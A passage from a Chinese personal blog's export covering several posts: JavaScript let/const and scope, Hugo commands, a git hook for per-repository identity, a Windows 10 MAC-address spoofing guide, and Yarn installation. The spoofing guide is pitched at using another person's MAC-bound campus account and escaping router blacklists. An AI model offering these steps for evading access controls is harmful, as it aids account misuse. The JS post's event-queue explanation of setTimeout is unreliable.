<p>上段代码也很好理解，关键是要理解作用域。</p>
<p>那么如果上段代码中想要先打印出函数外 a 的值，再声明函数内部的私有变量 a 可以吗？</p>
<p>答案是不可以，因为 let 解决了变量提升这个问题时，同时带来了另一个问题，那就是临时死区（Temporal Dead Zone， TDZ）。通俗的理解就是，若当前作用域中使用 let 关键字定义了与作用域外部同名的变量，那么在当前作用域内，定义同名变量之前，都不可以使用该变量，即使你的本意是想先使用外部同名变量，再定义内部同名变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="comment">// 在下面这句语句执行之前使用 a 都会报错，即使你想使用的是外面的 a</span></span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// print out 2</span></span><br><span class="line">&#125;</span><br><span class="line">getA();</span><br></pre></td></tr></table></figure>
<h3 id="const"><a class="markdownIt-Anchor" href="#const"></a> const</h3>
<p>const 与 let 类似，都没有变量提升，都存在临时死区。不同的是，const 声明的变量，只能在声明的同时初始化，之后是不允许赋值的（Object 类型数据除外），否则会报错。若没有在声明的同时初始化，也会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="number">1</span>;</span><br><span class="line">a = <span class="number">2</span>; <span class="comment">// error: Assignment to constant variable</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> b; <span class="comment">// error: Missing initializer in const declaration</span></span><br><span class="line">b = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>那么看下面的代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    name: <span class="string">'daijt'</span>,</span><br><span class="line">    age: <span class="number">18</span></span><br><span class="line">&#125;;</span><br><span class="line">obj.nickName = <span class="string">'captain'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(obj); <span class="comment">// &#123;name: 'daijt', age: 18, nickName: 'captain'&#125;</span></span><br></pre></td></tr></table></figure>
<p>为什么 const 声明的变量又可以修改其中的数据了呢？因为 obj 是个复杂数据，不是简单数据。conts 声明变量的本质是变量中的数据紧致修改，为什么复杂数据可以更改呢？因为 const 声明的变量中存储的是复杂对象的引用地址，而不是真真的数据，仅仅是数据的地址。因此在使用 const 声明了变量来引用复杂数据之后，还是可以修改该复杂数据的值。复杂数据有哪些呢？array Object、object Object、function Object 等。不建议使用 const 声明复杂数据，因为如果稍加不注意，就会更改了不想被改变的复杂数据的值。建议使用 const 声明简单数据，同时变量名大写。为什么简单数据的更改就能检测出来呢？因为简单数据是直接存储在栈内存中的，而不是像复杂对象，栈内存中存储的是堆内存中的引用地址。</p>
<h3 id="作用域"><a class="markdownIt-Anchor" href="#作用域"></a> 作用域</h3>
<p>说起作用域，ES6 新引入了一个块级作用域，之前 ES5 只有全局作用域与函数作用域。</p>
<p>在 ES6 之前，如果想要定义一个局部变量/私有变量该怎么办呢？答案是利用函数作用域。如果不想定义具名函数，浪费命名空间的话，可以使用立即执行函数（Immediately Invoked Function Expression， IIFE），如何定义立即执行函数？以下可作参考：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">( <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; code &#125; ).call(); <span class="comment">// can return value</span></span><br><span class="line"></span><br><span class="line">( <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; code &#125; .call()); <span class="comment">// can return value</span></span><br><span class="line"></span><br><span class="line">( <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; code &#125; )(); <span class="comment">// can return value</span></span><br><span class="line"></span><br><span class="line">! <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; code &#125; ();</span><br><span class="line"></span><br><span class="line">~ <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; code &#125; ();</span><br><span class="line"></span><br><span class="line">+ <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; code &#125; ();</span><br><span class="line"></span><br><span class="line">- <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; code &#125; ();</span><br></pre></td></tr></table></figure>
<p>以上几种都是 IIFE，值得注意的是前三种是可以有返回值的。数据可以通过括号传递。例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = (<span class="function"><span class="keyword">function</span> (<span class="params">num1, num2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num1+num2;</span><br><span class="line">&#125;)(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// print out 3</span></span><br></pre></td></tr></table></figure>
<p>ES6 中引入了块级作用域，那么声明私有变量/局部变量不用再利用函数作用域了，直接使用块级作用域 {} 即可，值得注意的是在花括号内使用 var 是没有用的，因为 ES5 没有块级作用域的概念。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// in ES6</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// print 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// print 1</span></span><br><span class="line"><span class="comment">// in ES5</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// print 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// print 2</span></span><br></pre></td></tr></table></figure>
<p>那么由作用域可以引入一个经典问题，问以下代码的执行完结果是什么？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// what will the console print out?</span></span><br></pre></td></tr></table></figure>
<p>很多人都知道会在 1s 之后打印出 5 个 5 。为什么呢？可以结合变量提升和作用域进行分析。由于 var 没有块级作用域，因此 var i 会声明 i 为全局变量，以上代码执行时情况如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">4</span>;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进一步拆分：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line">i = <span class="number">2</span>;</span><br><span class="line">i = <span class="number">3</span>;</span><br><span class="line">i = <span class="number">4</span>;</span><br><span class="line">i = <span class="number">5</span>;</span><br><span class="line"><span class="built_in">console</span>.log(i);</span><br><span class="line"><span class="built_in">console</span>.log(i);</span><br><span class="line"><span class="built_in">console</span>.log(i);</span><br><span class="line"><span class="built_in">console</span>.log(i);</span><br><span class="line"><span class="built_in">console</span>.log(i);</span><br></pre></td></tr></table></figure>
<p>那么 i = 5 是怎么来的呢？因为 i 为全局变量，在不满足循环条件的时候 i === 5，所以在 1s 之后打印出 5 个 5。那么如何打印出 0、1、2、3、4 呢？最简单的方法，将 var 改为 let：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将改为 let 的代码进行拆分，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;,<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">4</span>;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;,<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于使用了 let，因此花括号为块级作用域，内部的 i 为局部变量，延时函数在执行时，会优先在当前作用域访问 i，因此会打印出 0、1、2、3、4 。 此外还有其他方法，那就是利用立即执行函数:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;.call(),<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// print out 0、1、2、3、4</span></span><br></pre></td></tr></table></figure>
<p>这其中要涉及到事件队列，setTimeout 将第一个参数推入 Event queue 时，发现是个立即执行函数，则立即执行，打印出当前的 i 值。或者还可以改写如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">    setTimeout(<span class="built_in">console</span>.log(i),<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// print out 0、1、2、3、4</span></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>hugo usages</title>
    <url>/hexolog/post/959d1b61.html</url>
    <content><![CDATA[<h3 id="add-some-content"><a class="markdownIt-Anchor" href="#add-some-content"></a> Add Some Content</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">add an article [my-first-post.md] to folder [post]</span><br><span class="line">$ hugo new post/my-first-post.md</span><br><span class="line"></span><br><span class="line">add a new menu [about]</span><br><span class="line">$ hugo new about.md</span><br></pre></td></tr></table></figure>
<p>Edit the newly created content file if you want. Now, start the Hugo server with drafts enabled:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hugo server -D</span><br><span class="line"></span><br><span class="line">Started building sites ...</span><br><span class="line">Built site <span class="keyword">for</span> language en:</span><br><span class="line">1 of 1 draft rendered</span><br><span class="line">0 future content</span><br><span class="line">0 expired content</span><br><span class="line">1 regular pages created</span><br><span class="line">8 other pages created</span><br><span class="line">0 non-page files copied</span><br><span class="line">1 paginator pages created</span><br><span class="line">0 categories created</span><br><span class="line">0 tags created</span><br><span class="line">total <span class="keyword">in</span> 18 ms</span><br><span class="line">Watching <span class="keyword">for</span> changes <span class="keyword">in</span> /Users/bep/sites/quickstart/&#123;data,content,layouts,static,themes&#125;</span><br><span class="line">Serving pages from memory</span><br><span class="line">Web Server is available at http://localhost:1313/ (<span class="built_in">bind</span> address 127.0.0.1)</span><br><span class="line">Press Ctrl+C to stop</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Even theme preview</category>
      </categories>
      <tags>
        <tag>hugo usages</tag>
      </tags>
  </entry>
  <entry>
    <title>利用 Git-hook 自动配置不同仓库的用户信息</title>
    <url>/hexolog/post/2426aa95.html</url>
    <content><![CDATA[<p><a href="https://www.jianshu.com/p/69849461c38d" target="_blank" rel="noopener" title="Permalink to 利用 Git-hook 自动配置不同仓库的用户信息 - 简书">出自简书</a></p>
<blockquote>
<p>问题的起因来自于某天一位同学的问题：&quot;我给一个知名开源项目提交了代码，也被合并了，为什么 <code>contributors</code> 里面没有我？&quot;其实，这多是因为提交代码时本地仓库的<code>user.name</code>、<code>user.email</code>与GitHub账号不匹配导致，只有提交代码时的用户设置与自己的 <code>GitHub</code> 账号相匹配时，各项数据才会被 <code>GitHub</code> 计入统计。如下图所示，这样的 <code>commit</code> 记录便来自于一个用户设置和我 <code>GitHub</code> 账号不匹配的本地仓库。</p>
</blockquote>
<a id="more"></a>
<p><img src="https://upload-images.jianshu.io/upload_images/3587644-4d7e09639106ab82..jpg?imageMogr2/auto-orient/" alt="图1" /></p>
<p>如果你不仅使用 <code>GitHub</code> ，还会向公司自建的 <code>GitLab</code> ，以及 <code>oschina</code> 、<code>coding.net</code> 等基于 <code>Git</code> 的托管服务商提交代码，那么便会面临这个问题：你需要为不同来源的 <code>Git</code> 仓库一一配置用户名与邮箱信息，来避免上述的不同步情况。然而，手动在每个本地仓库路径下都使用 <code>git config user.name</code> 和 <code>git config user.email</code> 命令，难免会有忘记的情况，也过于繁琐。所以，我们可以使用<strong>Git初始模板、钩子函数</strong>的特性，达到在<strong>每次clone一个新的仓库时，根据仓库来源域名的不同，自动配置不同的用户信息</strong>。</p>
<ul>
<li>首先，在命令行使用该命令建立一个新的文件夹：<code>mkdir -p ~/.git-templates/hooks</code></li>
<li>然后配置git，让git知道这个文件夹是你的模板文件夹：<code>git config --global init.templatedir ~/.git-templates</code></li>
<li>接下来，在这个文件夹中新建钩子文件：<code>vi ~/.git-templates/hooks/post-checkout</code></li>
</ul>
<p>钩子文件的内容较长，可在文末附带的链接中查看复制即可，完成之后赋予这个文件可执行权限：<code>chmod +x ~/.git-templates/hooks/post-checkout</code></p>
<ul>
<li>最后，新建一个文件：<code>vi ~/.git-clone-init</code></li>
</ul>
<p>最后一个文件是唯一一个内容需要自己配置的文件，也是整个过程的关键，内容格式如图2，意为对应不同域名下的仓库，自动配置不同的<code>user.name</code>和<code>user.email</code>。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/3587644-63e2cc8365372415..jpg?imageMogr2/auto-orient/" alt="图2" /><br />
<strong>整个过程的原理就是我们在执行克隆操作时，git会执行初始模板里的钩子文件，钩子文件根据git-clone-init文件定义的规则，自动配置用户名与邮箱信息。这套流程来自于一个GitHub开源库，目前star还很少，大家可以去支持一下~</strong></p>
<p>参考：</p>
<ol>
<li><a href="https://github.com/DrVanScott/git-clone-init" target="_blank" rel="noopener">DrVanScott/git-clone-init</a></li>
<li><a href="https://segmentfault.com/a/1190000013283182" target="_blank" rel="noopener">让你的git拥有不同身份</a></li>
</ol>
]]></content>
      <categories>
        <category>git</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>git hook</tag>
        <tag>github</tag>
        <tag>配置</tag>
      </tags>
  </entry>
  <entry>
    <title>win10有线网卡及无线网卡mac地址的伪装</title>
    <url>/hexolog/post/c6b45260.html</url>
    <content><![CDATA[<blockquote>
<p>mac地址是硬件地址，又被称物理地址是用来定义网络设备的位置。现在很多学校喜欢把用户账号与电脑的mac地址绑定，以确定一台电脑登录一个账号。其实只需要把mac地址修改成他电脑的mac地址就可以使用小伙伴的网线，用小伙伴的账号登录了。<br />
另外当发现自己笔记本连的WiFi被限速或者被拉黑连不上了，同样可以修改无线网卡的mac地址来解除这些限制，因为路由器的限速及拉黑对象都是基于mac地址来识别的。下面看详细教程。</p>
</blockquote>
<a id="more"></a>
<p><strong>查看mac地址</strong><br />
打开命令提示符工具（<kbd>Win</kbd>+<kbd>R</kbd>输入<em>cmd</em>调出），进入cmd窗口,输入命令“<em>ipconfig /all</em> ”,回车如下：<br />
<img src="http://opifddwc7.bkt.clouddn.com/18-1-7/6728232.jpg" alt="cmd-mac" /><br />
<strong>查看网卡驱动名</strong><br />
设备管理器 --&gt; 网络适配器:<br />
<img src="http://opifddwc7.bkt.clouddn.com/18-1-7/15538728.jpg" alt="网络适配器" /></p>
<h2 id="伪装有线网卡mac地址"><a class="markdownIt-Anchor" href="#伪装有线网卡mac地址"></a> 伪装有线网卡mac地址</h2>
<p>设置 --&gt; 网络和Internet --&gt; 更改适配器选项（或者：控制面板 --&gt; 网络和 Internet --&gt; 网络连接）进入如下窗口：<br />
<img src="http://opifddwc7.bkt.clouddn.com/18-1-7/44018010.jpg" alt="网络连接" /><br />
右键单击以太网 --&gt; 属性，进入如下窗口：<br />
<img src="http://opifddwc7.bkt.clouddn.com/18-1-7/82473460.jpg" alt="以太网属性" /><br />
单击配置，进入如下窗口：<br />
<img src="http://opifddwc7.bkt.clouddn.com/18-1-7/85200316.jpg" alt="以太网属性配置" /><br />
选择 高级 --&gt; Network Address，在“值”里面填写你想要的任意mac地址。注意：</p>
<blockquote>
<ol>
<li>每两位之间不需要短横线“-”；</li>
<li>第二位数值只能是 “2”，“6”，“A”，“E”中的一个，否则设置无效</li>
</ol>
</blockquote>
<p>接下来按照<strong>查看mac地址</strong>方法验证一下，会发现以太网的mac地址确实变成我们刚才设的那个值了。</p>
<h2 id="伪装无线网卡mac地址"><a class="markdownIt-Anchor" href="#伪装无线网卡mac地址"></a> 伪装无线网卡mac地址</h2>
<p>当你用同样的步骤去修改无线网卡mac地址时，你会发现找不到 “Network Address”属性，因为对于绝大多数无线网卡,其驱动以及windows的支持并不把修改mac作为可行,这时我们就需要通过修改注册表来添加“Network Address”属性。下面介绍如何设置。<s>***请先保证每步都看懂了,备份注册表后,再进行尝试。注册表修改要慎重,尤其是本次涉及windows的网络模块,很可能做错了导致启动异常,所以保证看懂了,会用了,再去尝试。***</s></p>
<p><strong>打开注册表编辑器</strong><br />
<kbd>Win</kbd>+<kbd>R</kbd>输入<em>regedit</em>调出，<br />
<img src="http://opifddwc7.bkt.clouddn.com/18-1-7/81487741.jpg" alt="打开注册表编辑器" /><br />
定位到\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class{4d36e972-e325-11ce-bfc1-08002be10318}位置，如下：<br />
<img src="http://opifddwc7.bkt.clouddn.com/18-1-7/24331254.jpg" alt="有线网注册表配置位置" /><br />
并查看此下所有主键（0000，0001，0002，…，0017）,一般都有十个左右的主键,由于我个人笔记本用的外接网卡比较多,所以主键多点，这里有17个。从0000起,鼠标选中,查看右侧,查看名称为<strong>DriverDesc</strong>的项目数据,看看是不是刚刚在设备管理器中看到的网卡名称。看我的,我在0001中找到了自己的有线网卡<strong>Realtek PCle GBE Family Controler</strong>,0001主键中还有一项<strong>Network Address</strong>,其值是我的mac地址,此处可以修改固定网卡mac。<br />
<img src="http://opifddwc7.bkt.clouddn.com/18-1-7/67669703.jpg" alt="网卡注册表配置位置" /><br />
对比下0001/Ndi/params/主键下的内容,发现了吧,嘿嘿,完全对应windows的高级选项卡中的所有选项,这样相信大家已经有了大概想法了。<br />
<img src="http://opifddwc7.bkt.clouddn.com/18-1-7/33467140.jpg" alt="有线网卡注册表配置对应" /><br />
再按刚才的方法找无线网卡的主键,找到了0002主键，对应<strong>Intel® Dual Band Wireless-AC 3160</strong>无线网卡。<br />
<img src="http://opifddwc7.bkt.clouddn.com/18-1-7/35680674.jpg" alt="无线网卡注册表配置对应" /><br />
发现Ndi/params/下没有<strong>networkaddress</strong>项目（图片上是我后来添加的）,于是,我们想到了手动添加这些信息。如下图：<br />
<img src="http://opifddwc7.bkt.clouddn.com/18-1-7/56032009.jpg" alt="添加无线网卡注册表配置1" /><br />
在左侧 0002/Ndi/params下新建项目名称为<strong>NetworkAddress</strong>。<br />
<img src="http://opifddwc7.bkt.clouddn.com/18-1-7/90792947.jpg" alt="添加无线网卡注册表配置2" /><br />
接着选中<strong>NetworkAddress</strong>,右侧设置完全复制那个有线网卡的内容即可。其中default的值（即默认macd地址）可设可不设。<br />
OK，搞定！现在我们可以按照<em>伪装有线网卡mac地址</em>一样的方法来<em>伪装无线网卡mac地址</em>了。<br />
<img src="http://opifddwc7.bkt.clouddn.com/18-1-7/84508004.jpg" alt="无线网卡属性配置" /><br />
接下来按照<strong>查看mac地址</strong>方法验证一下，会发现以太网的mac地址确实变成我们刚才设的那个值了。如果没有，重启电脑试一下。<strong>最后再次强调：mac地址的第二位数值必须设置成 “2”，“6”，“A”，“E”中的一个，否则设置无效</strong></p>
<p><strong>参考</strong></p>
<ol>
<li><a href="https://jingyan.baidu.com/article/fcb5aff7abdc2dedaa4a71f4.html" target="_blank" rel="noopener">怎么修改电脑mac地址，如何修改win10的mac地址</a></li>
<li><a href="https://www.zhihu.com/question/36405648" target="_blank" rel="noopener">无线网卡的 mac 地址在 Win10中怎么修改？</a></li>
<li><a href="http://www.jb51.net/softjc/155004.html" target="_blank" rel="noopener">教你修改无线网卡的MAC地址的方法</a></li>
</ol>
]]></content>
      <categories>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>win10</tag>
        <tag>mac地址</tag>
      </tags>
  </entry>
  <entry>
    <title>yarn使用文档</title>
    <url>/hexolog/post/70a6ae5d.html</url>
    <content><![CDATA[<h2 id="新手指南"><a class="markdownIt-Anchor" href="#新手指南"></a> 新手指南</h2>
<p>Yarn 对你的代码来说是一个包管理器， 你可以通过它使用全世界开发者的代码，或者分享自己的代码。 Yarn 做这些快捷、安全、可靠，所以你不用担心什么。</p>
<p>通过Yarn你可以使用其他开发者针对不同问题的解决方案，使自己的开发过程更简单。 使用过程中遇到问题，你可以将其上报或者贡献解决方案。一旦问题被修复，Yarn会更新保持同步。</p>
<p>代码通过包（package）（或者称为模块（module））的方式来共享。 一个包里包含所有需要共享的代码，以及描述包信息的文件，称为<font color=#dc143c background-color=#b0c4de><code>package.json</code></font>。</p>
<a id="more"></a>
<h2 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h2>
<blockquote>
<p>稳定版：<a href="https://github.com/yarnpkg/yarn/releases/tag/v1.3.2" target="_blank" rel="noopener">v1.3.2</a><br />
Node.js版本：^4.8.0 || ^5.7.0 || ^6.2.2 || ^8.0.0</p>
</blockquote>
<p>在你使用 Yarn 之前，你需要先在系统中安装它。有一些不同的方法（还在增加）安装 Yarn：</p>
<h3 id="windows-中如何安装"><a class="markdownIt-Anchor" href="#windows-中如何安装"></a> windows 中如何安装</h3>
<p>在 Windows 系统中安装 Yarn 有多种方法</p>
<ul>
<li><strong>方法一：直接下载安装程序安装</strong></li>
</ul>
<p>这将给你一个.msi 文件(<a href="https://yarnpkg.com/latest.msi" target="_blank" rel="noopener">下载安装程序</a>)，当你运行它时带领你安装 Yarn 到 Windows 上。</p>
<p>前提，你需要先安装 <a href="https://nodejs.org/" target="_blank" rel="noopener">Node.js</a>。</p>
<ul>
<li><strong>方法二：用 Chocolatey 安装</strong></li>
</ul>
<p><a href="https://chocolatey.org/" target="_blank" rel="noopener">Chocolatey</a> 是一个适用于 Windows 的包管理器，您可以用这个*<a href="https://chocolatey.org/install" target="_blank" rel="noopener">操作方式</a>*安装。</p>
<p>如果你已经安装了 Chocolatey，你可以在你的控制台里运行下面的指令安装 yarn：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">choco install yarn</span><br></pre></td></tr></table></figure>
<p>同样的，你需要确保先安装了 <a href="https://nodejs.org/" target="_blank" rel="noopener">Node.js</a>。</p>
<ul>
<li><strong>方法三：通过 Scoop 安装</strong></li>
</ul>
<p><a href="http://scoop.sh/" target="_blank" rel="noopener">Scoop</a> 是一个 Windows 的命令行安装程序，你可以用<a href="https://github.com/lukesampson/scoop/wiki/Quick-Start" target="_blank" rel="noopener">这些指令</a>安装 Scoop。</p>
<p>安装好了 Scoop 后，你可以在控制台里运行下面的代码安装 yarn：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scoop install yarn</span><br></pre></td></tr></table></figure>
<p>如果之前没有安装 <a href="https://nodejs.org/" target="_blank" rel="noopener">Node.js</a>，scoop 将给你一个建议来安装它。 例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scoop install nodejs</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>方法四(备选)：通过 npm 安装</strong></li>
</ul>
<blockquote>
<p>**注意：**一般来说, 不推荐通过 npm 安装 Yarn 在用基于 Node 的包管理器安装 Yarn 时，该包未被签名，并且只通过基本的 SHA1 散列进行唯一完整性检查。 这在安装系统级应用时有安全风险。</p>
<p>因为这些原因，高度推荐用你的操作系统最适合的方式来安装 Yarn。</p>
</blockquote>
<p>你还可以通过 npm package manager 来安装 Yarn。 如果你已经装了Node.js，那你应该已经有 npm 了。<br />
安装好 npm 后你可以用如下命令来安装 yarn：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --global yarn</span><br></pre></td></tr></table></figure>
<p>此外你还需要在终端里设置<code>PATH</code>环境变量来全局访问 Yarn 的二进制可执行程序。<br />
添加 <code>set PATH=%PATH%;C:\.yarn\bin</code> 到你的 shell 环境。</p>
<blockquote>
<ul>
<li><strong>提示</strong>：<br />
请把你的项目目录和 Yarn 缓存目录 (%LocalAppData%\Yarn) 加到你的杀毒软件白名单里，否则安装包时会明显变慢，每个写入到硬盘时将被扫描。</li>
</ul>
</blockquote>
<ul>
<li><strong>测试 Yarn 是否安装成功</strong></li>
</ul>
<p>运行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn --version</span><br></pre></td></tr></table></figure>
<h3 id="mac-os-中如何安装"><a class="markdownIt-Anchor" href="#mac-os-中如何安装"></a> <a href="https://yarnpkg.com/zh-Hans/docs/install#mac-tab" target="_blank" rel="noopener">Mac OS 中如何安装</a></h3>
<h3 id="debianubuntu-linux-中如何安装"><a class="markdownIt-Anchor" href="#debianubuntu-linux-中如何安装"></a> <a href="https://yarnpkg.com/zh-Hans/docs/install#linux-tab" target="_blank" rel="noopener">Debian/Ubuntu Linux 中如何安装</a></h3>
<h3 id="nightly-builds"><a class="markdownIt-Anchor" href="#nightly-builds"></a> <a href="https://baike.baidu.com/item/Nightly%20Build/9058981" target="_blank" rel="noopener">Nightly Builds</a></h3>
<p>Nightly Builds 是 Yarn 最新和最大的版本，使用最新的 Yarn 代码构建。Nightly Builds 对于尝试还没有作为稳定版发布的新功能或测试 bug 修复很有用。这些 Builds 不保证稳定并且可能有 bugs。<br />
<a href="https://yarnpkg.com/zh-Hans/docs/nightly" target="_blank" rel="noopener">请参阅如何安装 Nightly Builds</a></p>
<blockquote>
<p>有问题吗？ 如果你不能用这些安装程序安装 Yarn，请通过 GitHub 搜索一个 issue 或者开一个新的 issue。</p>
<p><a href="https://github.com/yarnpkg/yarn/issues?utf8=%E2%9C%93&amp;q=is%3Aissue%20is%3Aopen%20%22Installation%20Problem%22%20in%3Atitle%20" target="_blank" rel="noopener">搜索现有的 issue</a> · <a href="https://github.com/yarnpkg/yarn/issues/new?title=Installation%20Problem:%20%5Btitle%5D&amp;body=%0A**Which%20operating%20system%20are%20you%20using:**%0A%0A%0A**Please%20describe%20the%20steps%20you%20took%20when%20trying%20to%20install%20Yarn%20and%20what%20went%20wrong:**%0A%0A" target="_blank" rel="noopener">开一个新的 issue</a></p>
</blockquote>
<h2 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h2>
<p>现在Yarn已经 安装完毕，可以开始使用。以下是一些你需要的最常用的命令：</p>
<ul>
<li><strong>初始化新项目</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn init</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>添加依赖包</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add [package]</span><br><span class="line">yarn add [package]@[version]</span><br><span class="line">yarn add [package]@[tag]</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>将依赖项添加到不同依赖项类别</strong><br />
分别添加到 <code>devDependencies</code>、<code>peerDependencies</code> 和 <code>optionalDependencies</code>：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add [package] --dev</span><br><span class="line">yarn add [package] --peer </span><br><span class="line">yarn add [package] --optional</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>升级依赖包</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn upgrade [package]</span><br><span class="line">yarn upgrade [package]@[version]</span><br><span class="line">yarn upgrade [package]@[tag]</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>移除依赖包</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn remove [package]</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>安装项目的全部依赖</strong></li>
</ul>
